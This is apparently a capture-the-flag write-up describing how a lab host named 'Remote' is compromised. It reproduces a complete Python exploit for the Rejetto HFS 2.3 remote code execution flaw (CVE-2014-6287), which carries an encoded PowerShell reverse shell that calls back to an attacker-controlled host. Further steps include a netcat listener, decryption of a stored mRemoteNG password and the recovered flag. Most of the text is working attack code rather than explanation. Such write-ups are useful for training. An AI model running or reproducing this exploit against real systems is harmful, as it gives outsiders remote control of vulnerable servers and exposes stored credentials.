# Remote

## Nmap scan

```
http://3.101.101.0:1337
```

```
searchsploit HttpFileServer 2.3
```

<img width="1132" height="166" alt="image" src="https://github.com/user-attachments/assets/2709a9d9-dac9-463d-bcdb-67684e4198ef" />

## edit script

```
https://github.com/thepedroalves/HFS-2.3-RCE-Exploit/blob/main/exploit.py
```

```
#!/usr/bin/python3
#
# Rejetto HFS 2.3.x RCE Vulnerability Exploit
# CVE-2014-6287
#
# Using Nikhil Mittal Powershell Reverse Shell One Liner
#
#

import requests
import urllib
import base64

lhost = 'FRANKISHTIEN-64015.portmap.host' # Change this
lport = '64015'        # Change this
rhost = '54.176.68.184' # Change this
rport = '1337'        # Change this

command = '$client = New-Object System.Net.Sockets.TCPClient("' + lhost + '",' + lport + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

command_bytes = command.encode('utf-16le')
base64_bytes = base64.b64encode(command_bytes)
encodedcommand = base64_bytes.decode('ascii')

payload = 'exec|powershell.exe -ep bypass -encodedcommand ' + encodedcommand 

encodedpayload = urllib.parse.quote_plus(payload)

url = 'http://' + rhost + ':' + rport + '/?search=%00{.' + encodedpayload + '.}'

r = requests.get(url)

if r.status_code == 200:
    print('GET Request Sent')
else:
    print('Failed to Send Request')
```

<img width="1503" height="834" alt="image" src="https://github.com/user-attachments/assets/408d8ba4-2a41-4f67-ae95-557511550249" />

<img width="1169" height="786" alt="image" src="https://github.com/user-attachments/assets/53dfbd61-db63-4663-af5d-7d305ccbecdf" />

```
sudo openvpn --config FRANKISHTIEN.first.ovpn
```

<img width="1033" height="385" alt="image" src="https://github.com/user-attachments/assets/0a994f9c-1ded-4aa1-91a6-331a1c0708db" />

```
python3 exploit.py
nc -lnvp 9999
```

<img width="757" height="151" alt="image" src="https://github.com/user-attachments/assets/256c0bdc-90d0-4035-833e-f6d1dfd98eef" />

<img width="973" height="352" alt="image" src="https://github.com/user-attachments/assets/ef9c27aa-097c-43ed-a51b-6ec727d06922" />

<img width="909" height="535" alt="image" src="https://github.com/user-attachments/assets/d8701862-17c3-42d3-a1d9-72541e316bd8" />

> ## after some search found this explotaion to mremoteng

```
https://vk9-sec.com/exploiting-mremoteng/
```

<img width="1158" height="609" alt="image" src="https://github.com/user-attachments/assets/1c81e425-8cc6-44f3-9d14-de84a5f40d46" />

```
Password="UrEP/swCis5pretwdL/frrCaV5c6P4mPz2RcKr91qJAj1yiMtMUg5zrbxH6gyqoMQZSs0HIbPn/K6mx3rkvjBXYaXw=="
```

```
python3 mremoteng_decrypt.py -s UrEP/swCis5pretwdL/frrCaV5c6P4mPz2RcKr91qJAj1yiMtMUg5zrbxH6gyqoMQZSs0HIbPn/K6mx3rkvjBXYaXw==
```

<img width="1167" height="167" alt="image" src="https://github.com/user-attachments/assets/9fe73392-c99a-46e6-a269-d66824d9ccc6" />

## **`password`**

```
aw3s0m3_r3m0te_fl4g
```

